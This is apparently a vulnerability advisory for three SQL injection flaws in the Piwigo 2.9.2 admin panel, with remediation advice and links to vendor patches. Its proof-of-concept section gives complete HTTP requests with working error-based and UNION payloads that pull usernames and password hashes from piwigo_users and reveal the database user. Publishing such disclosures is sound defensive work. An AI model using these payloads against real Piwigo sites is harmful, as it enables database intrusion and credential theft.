-----
layout: none
-----

## Multiple SQL Injection Vulnerabilities in Piwigo 2.9.2



<u>**Affected Version : <=2.9.2**</u>

<u>**Description:**</u> 

It was identified that admin panel of Piwigo application is vulnerable to multiple [SQL Injection](https://www.owasp.org/index.php/SQL_Injection) vulnerabilities. An attacker can exploit these vulnerabilities to gain access to the connected MySQL database. 

**<u>Vulnerable Instances:</u>**

* /admin/user_list_backend.php, **[POST] sSortDir_0**
* /admin.php?page=batch_manager&mode=unit, **[POST] element_ids**
* /admin.php?page=configuration&section=main, **[POST] order_by[]**

**<u>Proof of Concept:</u>**

Case 1: Users > Manage *Component*

**REQUEST**

```markdown
POST /piwigo-2.9.2/piwigo/admin/user_list_backend.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost/piwigo-2.9.2/piwigo/admin.php?page=user_list
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 782
Cookie: pwg_id=vbv2rpb1899a2rldng60bjfl27
Connection: close

sEcho=1&iColumns=7&sColumns=%2C%2C%2C%2C%2C%2C&iDisplayStart=0&iDisplayLength=10&mDataProp_0=0&sSearch_0=&bRegex_0=false&bSearchable_0=true&bSortable_0=true&mDataProp_1=1&sSearch_1=&bRegex_1=false&bSearchable_1=true&bSortable_1=true&mDataProp_2=2&sSearch_2=&bRegex_2=false&bSearchable_2=true&bSortable_2=true&mDataProp_3=3&sSearch_3=&bRegex_3=false&bSearchable_3=true&bSortable_3=true&mDataProp_4=4&sSearch_4=&bRegex_4=false&bSearchable_4=true&bSortable_4=true&mDataProp_5=5&sSearch_5=&bRegex_5=false&bSearchable_5=true&bSortable_5=true&mDataProp_6=6&sSearch_6=&bRegex_6=false&bSearchable_6=true&bSortable_6=true&sSearch=&bRegex=false&iSortCol_0=0&sSortDir_0=`and+extractvalue(0x0a,concat(0x0a,(select group_concat(username,password) from piwigo_users limit 0,1)))+--+`&iSortingCols=1
```

**RESPONSE**

![sql_1](/assets/images/piwigo2.9.2/sql_1.png)



Case 2: Photos > Batch Manager *Component*

**REQUEST**

```markdown
POST /piwigo-2.9.2/piwigo/admin.php?page=batch_manager&mode=unit HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: pwg_id=jbhjl8k57er0lucpcfv015c4h1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 496

element_ids=12%2c13`)+union select group_concat(username,0x3a,password,0x3c62723e),2 from piwigo_users+--+`&name-12=funny+cat+5-wallpaper-1920x1080&author-12=this+is+test&date_creation-12=2016-11-24+00%3A00%3A00&level-12=0&tags-12%5B%5D=this+is+test&description-12=this+is+test&name-13=pirates+of+the+caribbean+dead+men+tell+no+tales-wallpaper-960x600&author-13=this+is+test2&date_creation-13=2016-11-23+00%3A00%3A00&level-13=0&tags-13%5B%5D=this+is+test2&description-13=this+is+test2&submit=Submit
```

**RESPONSE**

![sql_2](/assets/images/piwigo2.9.2/sql_2.png)

Case 3: Configuration *Component*

```markdown
POST /piwigo-2.9.2/piwigo/admin.php?page=configuration&section=main HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost/piwigo-2.9.2/piwigo/admin.php?page=configuration
Content-Type: application/x-www-form-urlencoded
Content-Length: 415
Cookie: pwg_id=jbhjl8k57er0lucpcfv015c4h1; pwg_display_thumbnail=no_display_thumbnail
Connection: close
Upgrade-Insecure-Requests: 1

gallery_title=Just+another+Piwigo+gallery&page_banner=%3Ch1%3E%25piwigo_title%25%3C%2Fh1%3E%0D%0A%0D%0A%3Cp%3EWelcome+to+my+photo+gallery%3C%2Fp%3E&order_by%5B%5D=date_available+DESC&order_by%5B%5D=file&order_by%5B%5D=`extractvalue(0x0a,concat(0x0a,(select user())))`&rate_anonymous=on&allow_user_registration=on&allow_user_customization=on&week_starts_on=monday&history_guest=on&log=on&mail_theme=clear&submit=
```

Result of above request is reflected at following URL which is accessible publicly.

* /piwigo/index.php?/categories/created-monthly-list

![sql_3](/assets/images/piwigo2.9.2/sql_3.png)



<u>**Remediation:**</u>

As the application make use of MVC architecture, it is recommended to implement a middleware or centralized controller that make use of [Parameterized queries](http://php.net/manual/en/intro.pdo.php) and [Input Validation](https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet) to sanitize user input before concatenating them with dynamically generated SQL queries.



**<u>Vendor Patches:</u>**

The patches issued by vendor for above vulnerabilities are as follows :

* [Admin/Users](https://github.com/Piwigo/Piwigo/commit/33a03e9afb8fb00c9d8f480424d549311fe03d40)


* [Batch Manager](https://github.com/Piwigo/Piwigo/commit/f7c8e0a947a857ff5d31dafd03842df41959b84c)
* [Configuration](https://github.com/Piwigo/Piwigo/commit/91ef7909a5c51203f330cbecf986472900b60983) 

